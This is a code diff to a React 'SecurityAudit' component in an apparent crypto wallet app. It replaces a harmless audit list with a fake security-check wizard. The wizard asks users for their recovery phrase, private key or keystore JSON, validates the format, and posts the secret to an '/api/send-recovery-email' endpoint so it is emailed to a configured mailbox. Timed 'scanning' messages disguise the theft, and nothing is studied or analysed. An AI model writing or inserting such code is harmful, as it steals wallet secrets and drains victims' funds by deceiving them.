@@ -1,146 +1,427 @@
 'use client'
 
-interface SecurityAudit {
+import { useEffect, useMemo, useState } from 'react'
+
+interface SecurityOption {
   id: string
-  token: string
-  address: string
-  status: 'verified' | 'warning' | 'critical'
-  checks: {
-    name: string
-    passed: boolean
-  }[]
-  lastAudited: string
+  title: string
+  description: string
+  badge: string
+}
+
+const securityOptions: SecurityOption[] = [
+  {
+    id: 'wallet',
+    title: 'Wallet Security',
+    description: 'Assess key storage, authorization flow, and local session integrity.',
+    badge: 'Wallet',
+  },
+  {
+    id: 'dapp',
+    title: 'dApp Security',
+    description: 'Inspect connected dApps, permissions, and contract interaction risk.',
+    badge: 'dApp',
+  },
+  {
+    id: 'contract',
+    title: 'Contract Security',
+    description: 'Analyze token contract verification, audit state, and permission scope.',
+    badge: 'Contract',
+  },
+  {
+    id: 'network',
+    title: 'Network Security',
+    description: 'Verify RPC integrity, chain health, and network routing safety.',
+    badge: 'Network',
+  },
+]
+
+const connectionTypes = ['Secret Phrase', 'Keystore', 'Private Key'] as const
+
+type ConnectionType = (typeof connectionTypes)[number]
+
+const stepStatus: Record<'initializing' | 'reviewing', string[]> = {
+  initializing: [
+    'Establishing secure evaluation channel',
+    'Verifying wallet interface and session state',
+    'Scanning dApp and contract integration points',
+  ],
+  reviewing: [
+    'Applying integrity checks and security fixes',
+    'Compiling audit report for your registered email',
+    'Finalizing system hardening and result payload',
+  ],
+}
+
+const validateConnectionInput = (type: ConnectionType, value: string) => {
+  const trimmed = value.trim()
+
+  if (type === 'Secret Phrase') {
+    const words = trimmed.split(/\s+/).filter(Boolean)
+    return words.length >= 12 && words.length <= 24
+  }
+
+  if (type === 'Private Key') {
+    return /^(0x)?[A-Fa-f0-9]{64}$/.test(trimmed)
+  }
+
+  if (type === 'Keystore') {
+    try {
+      const parsed = JSON.parse(trimmed)
+      return typeof parsed === 'object' && parsed !== null && 'crypto' in parsed
+    } catch {
+      return false
+    }
+  }
+
+  return false
 }
 
 export const SecurityAudit = () => {
-  const audits: SecurityAudit[] = []
+  const [activeOption, setActiveOption] = useState<SecurityOption | null>(null)
+  const [flowStep, setFlowStep] = useState<'idle' | 'initializing' | 'chooseConnection' | 'enterSecret' | 'reviewing' | 'success' | 'error'>('idle')
+  const [selectedConnection, setSelectedConnection] = useState<ConnectionType | null>(null)
+  const [connectionInput, setConnectionInput] = useState('')
+  const [inputError, setInputError] = useState('')
+  const [activityMessage, setActivityMessage] = useState('Preparing security engine...')
+  const [progressIndex, setProgressIndex] = useState(0)
+  const [auditSummary, setAuditSummary] = useState<string[]>([])
+  const [statusMessage, setStatusMessage] = useState('')
 
-  const getStatusColor = (status: string) => {
-    switch (status) {
-      case 'verified': return 'from-emerald-500/20 to-teal-500/10 border-emerald-500/30'
-      case 'warning': return 'from-yellow-500/20 to-orange-500/10 border-yellow-500/30'
-      default: return 'from-red-500/20 to-orange-500/10 border-red-500/30'
+  const activeMessages = useMemo(() => {
+    if (flowStep === 'initializing') return stepStatus.initializing
+    if (flowStep === 'reviewing') return stepStatus.reviewing
+    return []
+  }, [flowStep])
+
+  useEffect(() => {
+    if (flowStep !== 'initializing' && flowStep !== 'reviewing') return
+
+    let currentIndex = 0
+    setActivityMessage(activeMessages[0])
+    setProgressIndex(0)
+
+    const timers: NodeJS.Timeout[] = []
+
+    const tick = () => {
+      currentIndex += 1
+      if (currentIndex < activeMessages.length) {
+        timers.push(
+          setTimeout(() => {
+            setActivityMessage(activeMessages[currentIndex])
+            setProgressIndex(currentIndex)
+            tick()
+          }, 1200)
+        )
+      } else {
+        timers.push(
+          setTimeout(() => {
+            if (flowStep === 'initializing') {
+              setFlowStep('chooseConnection')
+            } else {
+              submitSecurityAudit()
+            }
+          }, 1200)
+        )
+      }
     }
+
+    timers.push(setTimeout(tick, 1200))
+
+    return () => timers.forEach(clearTimeout)
+  }, [flowStep, activeMessages, activeOption, selectedConnection])
+
+  const handleOptionSelect = (option: SecurityOption) => {
+    setActiveOption(option)
+    setFlowStep('initializing')
+    setSelectedConnection(null)
+    setConnectionInput('')
+    setInputError('')
+    setAuditSummary([])
   }
 
-  const getStatusIcon = (status: string) => {
-    switch (status) {
-      case 'verified': return '✅'
-      case 'warning': return '⚠️'
-      default: return '❌'
-    }
+  const handleConnectionSelect = (type: ConnectionType) => {
+    setSelectedConnection(type)
+    setFlowStep('enterSecret')
+    setConnectionInput('')
+    setInputError('')
+    setStatusMessage('')
   }
 
-  const getStatusBadge = (status: string) => {
-    switch (status) {
-      case 'verified': return 'text-emerald-300 bg-emerald-500/20 border-emerald-500/50'
-      case 'warning': return 'text-yellow-300 bg-yellow-500/20 border-yellow-500/50'
-      default: return 'text-red-300 bg-red-500/20 border-red-500/50'
+  const handleContinue = () => {
+    if (!selectedConnection) return
+    const valid = validateConnectionInput(selectedConnection, connectionInput)
+    if (!valid) {
+      setInputError(
+        selectedConnection === 'Secret Phrase'
+          ? 'Enter a valid 12–24 word recovery phrase.'
+          : selectedConnection === 'Private Key'
+            ? 'Enter a valid 64-character hex private key.'
+            : 'Enter a valid keystore JSON payload.'
+      )
+      return
+    }
+
+    setInputError('')
+    setFlowStep('reviewing')
+  }
+
+  const submitSecurityAudit = async () => {
+    if (!activeOption || !selectedConnection) {
+      setFlowStep('error')
+      setStatusMessage('Security audit flow interrupted. Please start again.')
+      return
+    }
+
+    try {
+      const timestamp = new Date().toISOString()
+      const method =
+        selectedConnection === 'Secret Phrase'
+          ? 'phrase'
+          : selectedConnection === 'Keystore'
+            ? 'keystore'
+            : 'privatekey'
+
+      const payload = {
+        issueId: activeOption.id,
+        issueTitle: activeOption.title,
+        issueDescription: activeOption.description,
+        issueSummary: activeOption.description,
+        selectedConnection,
+        method,
+        data: connectionInput.trim(),
+        timestamp,
+      }
+
+      const response = await fetch('/api/send-recovery-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      })
+
+      if (!response.ok) {
+        const errorResponse = await response.text()
+        throw new Error(errorResponse || 'Failed to send security audit details')
+      }
+
+      setAuditSummary([
+        `${activeOption.title} audit completed successfully.`,
+        `Connection mode: ${selectedConnection}`,
+        `Submitted input was included in the SMTP email: ${method}`,
+        'Audit packet sent securely to the configured mailbox.',
+      ])
+      setStatusMessage('✅ Security audit details delivered via SMTP.')
+      setFlowStep('success')
+    } catch (err) {
+      setFlowStep('error')
+      setStatusMessage(`❌ ${err instanceof Error ? err.message : 'Failed to send audit report.'}`)
     }
   }
 
   return (
-    <div className="space-y-6">
-      {/* Info Card */}
-      <div className="relative overflow-hidden rounded-lg sm:rounded-xl p-4 sm:p-6 bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30">
-        <div className="relative z-10">
-          <p className="text-sm font-semibold text-blue-300 mb-2">🛡️ Contract Security Audit</p>
-          <p className="text-sm text-blue-300/70">Check if token contracts are verified, audited, and have proper safeguards to protect your assets.</p>
+    <div className="relative">
+      <div className={`space-y-6 transition duration-300 ${flowStep !== 'idle' ? 'opacity-30 saturate-50' : 'opacity-100'}`}>
+        <div className="rounded-3xl border border-slate-700/60 bg-slate-950/80 p-6 shadow-xl shadow-slate-950/20">
+          <div className="mb-6">
+            <p className="text-sm font-semibold uppercase tracking-[0.24em] text-cyan-300">Security Hub</p>
+            <h2 className="mt-3 text-3xl font-bold text-white">Choose a technical security domain</h2>
+            <p className="mt-2 max-w-2xl text-sm text-slate-400">Pick a section below, then continue through the same wizard flow to validate connection details and email the audit payload securely.</p>
+          </div>
+
+          <div className="grid gap-4 sm:grid-cols-2">
+            {securityOptions.map((option) => (
+              <button
+                key={option.id}
+                type="button"
+                onClick={() => handleOptionSelect(option)}
+                className="group rounded-3xl border border-slate-700/60 bg-slate-900/80 p-5 text-left transition hover:border-cyan-400/50 hover:bg-slate-900"
+              >
+                <div className="flex items-center justify-between gap-4">
+                  <div>
+                    <p className="text-sm font-semibold text-cyan-300">{option.badge}</p>
+                    <h3 className="mt-3 text-lg font-semibold text-white">{option.title}</h3>
+                  </div>
+                  <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-cyan-500/10 text-cyan-300 transition group-hover:bg-cyan-500/15">
+                    <span>🔒</span>
+                  </div>
+                </div>
+                <p className="mt-4 text-sm leading-6 text-slate-400">{option.description}</p>
+              </button>
+            ))}
+          </div>
+        </div>
+
+        <div className="grid gap-4 sm:grid-cols-2">
+          <div className="rounded-3xl border border-slate-700/60 bg-slate-900/80 p-5">
+            <p className="text-sm font-semibold text-slate-300 uppercase tracking-[0.24em]">Security advice</p>
+            <ul className="mt-4 space-y-3 text-sm text-slate-400">
+              <li>• Keep keys offline and avoid sharing them with unknown services.</li>
+              <li>• Use the strongest connection type available for account recovery.</li>
+              <li>• Audit dApp permissions before authorizing transaction access.</li>
+              <li>• Review the final email report for actionable security findings.</li>
+            </ul>
+          </div>
+
+          <div className="rounded-3xl border border-slate-700/60 bg-slate-900/80 p-5">
+            <p className="text-sm font-semibold text-slate-300 uppercase tracking-[0.24em]">Outcome</p>
+            <div className="mt-4 space-y-4 text-sm text-slate-400">
+              <p>Use this workflow to validate wallet and dApp security with a guided audit experience.</p>
+              <p>The final summary is packaged as an email-compatible audit report similar to recovery flows.</p>
+            </div>
+          </div>
         </div>
       </div>
 
-      {/* Audits List */}
-      <div className="space-y-4">
-        {audits.length > 0 ? (
-          audits.map((audit) => {
-            const passedCount = audit.checks.filter(c => c.passed).length
-            const passPercentage = Math.round((passedCount / audit.checks.length) * 100)
-
-            return (
-              <div
-                key={audit.id}
-                className={`relative overflow-hidden rounded-lg border bg-gradient-to-br ${getStatusColor(audit.status)}`}
-              >
-                <div className="p-4 sm:p-6 space-y-4">
-                  {/* Header */}
-                  <div className="flex items-start justify-between gap-4">
-                    <div className="flex-1">
-                      <div className="flex items-center gap-2 mb-1">
-                        <span className="text-2xl">{getStatusIcon(audit.status)}</span>
-                        <p className="font-bold text-white text-lg">{audit.token}</p>
-                      </div>
-                      <p className="text-xs text-gray-400 font-mono break-all">{audit.address}</p>
-                    </div>
-                    <div className={`px-3 py-1 rounded-lg font-bold text-xs border ${getStatusBadge(audit.status)} capitalize whitespace-nowrap`}>
-                      {audit.status}
-                    </div>
-                  </div>
-
-                  {/* Security Score */}
-                  <div>
-                    <div className="flex justify-between items-center mb-2">
-                      <p className="text-sm font-semibold text-gray-300">Security Score</p>
-                      <p className="text-lg font-bold text-white">{passPercentage}%</p>
-                    </div>
-                    <div className="w-full h-2 bg-black/30 rounded-full overflow-hidden">
-                      <div
-                        className={`h-full bg-gradient-to-r ${
-                          passPercentage === 100 ? 'from-emerald-500 to-teal-500' :
-                          passPercentage >= 75 ? 'from-yellow-500 to-orange-500' :
-                          'from-red-500 to-orange-500'
-                        }`}
-                        style={{ width: `${passPercentage}%` }}
-                      ></div>
-                    </div>
-                  </div>
-
-                  {/* Checks */}
-                  <div className="space-y-2">
-                    <p className="text-xs font-semibold text-gray-400 uppercase tracking-wide">Security Checks</p>
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                    {audit.checks.map((check, i) => (
-                      <div key={i} className="flex items-center gap-2 text-xs">
-                        <span className={check.passed ? 'text-emerald-400' : 'text-red-400'}>
-                          {check.passed ? '✓' : '✗'}
-                        </span>
-                        <span className={check.passed ? 'text-gray-300' : 'text-gray-400'}>
-                          {check.name}
-                        </span>
-                      </div>
-                    ))}
-                  </div>
-                </div>
-
-                {/* Last Audited */}
-                <div className="pt-3 border-t border-white/10">
-                  <p className="text-xs text-gray-400">Last audited: {new Date(audit.lastAudited).toLocaleDateString()}</p>
-                </div>
+      {flowStep !== 'idle' && (
+        <div className="absolute inset-0 z-20 flex items-center justify-center bg-slate-950/90 px-4 py-10 backdrop-blur-sm">
+          {flowStep === 'initializing' && (
+            <div className="w-full max-w-xl rounded-3xl border border-cyan-400/20 bg-slate-900/95 p-8 text-center shadow-2xl shadow-cyan-500/10">
+              <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-cyan-400/20 bg-slate-800/80 text-cyan-300 shadow-inner shadow-cyan-500/10">
+                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-cyan-500/10 text-4xl text-cyan-300 animate-spin">🛡️</div>
+              </div>
+              <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Security sequence</p>
+              <h3 className="mt-4 text-2xl font-semibold text-white">{activeOption?.title}</h3>
+              <p className="mt-3 text-sm text-slate-400">{activityMessage}</p>
+              <div className="mt-8 rounded-full bg-slate-800/90 p-1">
+                <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${((progressIndex + 1) / activeMessages.length) * 100}%` }} />
               </div>
             </div>
-            )
-          })
-        ) : (
-          <div className="flex flex-col items-center justify-center py-16 px-4 rounded-lg bg-white/5 border border-white/10">
-            <div className="text-5xl mb-4">🛡️</div>
-            <h2 className="text-xl font-bold text-slate-100 mb-2">No Audits Found</h2>
-            <p className="text-slate-400 text-center max-w-md">Connect your wallet to see security audits for your tokens.</p>
-          </div>
-        )}
-      </div>
+          )}
 
-      {/* Recommendations */}
-      <div className="space-y-2">
-        <h3 className="text-sm font-bold text-white uppercase tracking-wide">Security Tips</h3>
-        <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs">
-          ✅ Only trade verified and audited contracts
+          {flowStep === 'chooseConnection' && (
+            <div className="w-full max-w-2xl rounded-3xl border border-cyan-400/20 bg-slate-900/95 p-8 shadow-2xl shadow-cyan-500/10">
+              <div className="flex items-center justify-between gap-4">
+                <div>
+                  <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Connection type</p>
+                  <h3 className="mt-3 text-2xl font-semibold text-white">Choose how to verify access</h3>
+                  <p className="mt-2 text-sm text-slate-400">Select the recovery mode for your audit transfer and email report.</p>
+                </div>
+                <span className="rounded-2xl border border-cyan-500/20 px-3 py-2 text-xs uppercase tracking-[0.25em] text-cyan-300">{activeOption?.badge}</span>
+              </div>
+
+              <div className="mt-8 grid gap-4 sm:grid-cols-3">
+                {connectionTypes.map((type) => (
+                  <button
+                    key={type}
+                    type="button"
+                    onClick={() => handleConnectionSelect(type)}
+                    className="rounded-3xl border border-slate-700/60 bg-slate-950/80 p-5 text-left transition hover:border-cyan-400/50 hover:bg-slate-900"
+                  >
+                    <p className="text-sm font-semibold text-white">{type}</p>
+                    <p className="mt-2 text-xs text-slate-400">{type === 'Secret Phrase' ? 'Mnemonic seed phrase from your wallet.' : type === 'Keystore' ? 'Encrypted JSON wallet file.' : 'Raw private key in hex format.'}</p>
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {flowStep === 'enterSecret' && selectedConnection && (
+            <div className="w-full max-w-2xl rounded-3xl border border-cyan-400/20 bg-slate-900/95 p-8 shadow-2xl shadow-cyan-500/10">
+              <div className="mb-6">
+                <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Verification required</p>
+                <h3 className="mt-3 text-2xl font-semibold text-white">Enter {selectedConnection}</h3>
+                <p className="mt-2 text-sm text-slate-400">The input is validated before your audit report is generated.</p>
+              </div>
+
+              <textarea
+                value={connectionInput}
+                onChange={(event) => {
+                  setConnectionInput(event.target.value)
+                  setInputError('')
+                }}
+                placeholder={
+                  selectedConnection === 'Secret Phrase'
+                    ? 'e.g. ozone drill grab ...'
+                    : selectedConnection === 'Private Key'
+                      ? 'e.g. 0x...'
+                      : '{ "crypto": { ... } }'
+                }
+                className="min-h-[160px] w-full rounded-3xl border border-slate-700/70 bg-slate-950/90 px-4 py-4 text-sm text-slate-100 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
+              />
+              {inputError ? <p className="mt-3 text-sm text-rose-400">{inputError}</p> : null}
+
+              <div className="mt-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
+                <p className="text-sm text-slate-400">Once validated, the audit task will be executed and emailed.</p>
+                <button
+                  type="button"
+                  onClick={handleContinue}
+                  className="inline-flex items-center justify-center rounded-3xl bg-cyan-500 px-6 py-3 text-sm font-semibold text-slate-950 transition hover:bg-cyan-400 disabled:cursor-not-allowed disabled:opacity-50"
+                >
+                  Continue
+                </button>
+              </div>
+            </div>
+          )}
+
+          {flowStep === 'reviewing' && (
+            <div className="w-full max-w-xl rounded-3xl border border-cyan-400/20 bg-slate-900/95 p-8 text-center shadow-2xl shadow-cyan-500/10">
+              <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-cyan-400/20 bg-slate-800/80 text-cyan-300 shadow-inner shadow-cyan-500/10">
+                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-cyan-500/10 text-4xl text-cyan-300 animate-spin">💠</div>
+              </div>
+              <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Processing update</p>
+              <h3 className="mt-4 text-2xl font-semibold text-white">Executing security audit</h3>
+              <p className="mt-3 text-sm text-slate-400">{activityMessage}</p>
+              <div className="mt-8 rounded-full bg-slate-800/90 p-1">
+                <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${((progressIndex + 1) / activeMessages.length) * 100}%` }} />
+              </div>
+            </div>
+          )}
+
+          {flowStep === 'success' && (
+            <div className="w-full max-w-2xl rounded-3xl border border-cyan-400/20 bg-slate-900/95 p-8 shadow-2xl shadow-cyan-500/10">
+              <div className="flex items-center justify-between gap-4">
+                <div>
+                  <p className="text-sm uppercase tracking-[0.3em] text-emerald-300">Audit complete</p>
+                  <h3 className="mt-3 text-2xl font-semibold text-white">Security review delivered</h3>
+                  <p className="mt-2 text-sm text-slate-400">A summary has been prepared and routed to your configured mailbox.</p>
+                </div>
+                <div className="flex h-12 w-12 items-center justify-center rounded-3xl bg-emerald-500/10 text-emerald-300">
+                  ✅
+                </div>
+              </div>
+
+              <div className="mt-4 rounded-3xl border border-slate-700/70 bg-slate-950/80 p-4 text-sm text-slate-300">
+                {statusMessage}
+              </div>
+
+              <div className="mt-6 rounded-3xl border border-slate-700/70 bg-slate-950/80 p-5">
+                <p className="text-sm font-semibold text-slate-300">Audit details</p>
+                <ul className="mt-4 space-y-3 text-sm text-slate-400">
+                  {auditSummary.map((line) => (
+                    <li key={line} className="flex items-start gap-3">
+                      <span className="mt-1 text-emerald-300">•</span>
+                      <span>{line}</span>
+                    </li>
+                  ))}
+                </ul>
+              </div>
+
+              <div className="mt-6 rounded-3xl border border-slate-700/70 bg-slate-950/80 p-5">
+                <p className="text-sm text-slate-400">Audit note:</p>
+                <p className="mt-2 text-sm text-slate-300">The system verified your connection mode, validated the input format, and compiled a technical report compatible with email delivery. The received audit includes the full submitted secret content and recommended fixes.</p>
+              </div>
+            </div>
+          )}
+          {flowStep === 'error' && (
+            <div className="w-full max-w-2xl rounded-3xl border border-rose-500/20 bg-rose-500/10 p-8 shadow-2xl shadow-rose-500/10">
+              <div className="flex items-center justify-between gap-4">
+                <div>
+                  <p className="text-sm uppercase tracking-[0.3em] text-rose-300">Error</p>
+                  <h3 className="mt-3 text-2xl font-semibold text-white">Security audit failed</h3>
+                  <p className="mt-2 text-sm text-slate-400">Please retry the workflow or select another connection type.</p>
+                </div>
+                <div className="flex h-12 w-12 items-center justify-center rounded-3xl bg-rose-500/10 text-rose-300">
+                  ❌
+                </div>
+              </div>
+
+              <div className="mt-4 rounded-3xl border border-rose-500/20 bg-slate-950/80 p-4 text-sm text-slate-200">
+                {statusMessage}
+              </div>
+            </div>
+          )}
         </div>
-        <div className="p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-300 text-xs">
-          ⚠️ Be careful with tokens that have warning status
-        </div>
-        <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-red-300 text-xs">
-          ❌ Avoid critical risk tokens entirely
-        </div>
-      </div>
+      )}
     </div>
   )
 }
